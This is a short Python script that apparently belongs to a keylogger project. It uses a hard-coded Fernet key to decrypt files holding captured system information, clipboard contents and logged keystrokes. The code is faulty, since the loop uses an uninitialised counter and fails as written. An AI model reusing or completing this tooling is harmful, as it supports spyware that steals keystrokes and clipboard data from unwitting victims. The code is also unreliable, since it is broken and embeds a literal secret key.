from cryptography.fernet import Fernet

key = "r5W4k2Fw42NXcWaxaPa3_PBsnXdVuDx7ktIT51x18AA="

system_information_e = "e_system.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_keys_logged.txt"

encrypted_file = [system_information_e, clipboard_information_e, keys_information_e]

for decrypting_files in encrypted_file:
        with open(encrypted_file[count], 'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        decrypted = fernet.decrypt(data)

        with open(encrypted_file[count], 'wb') as f:
            f.write(decrypted)

        count += 1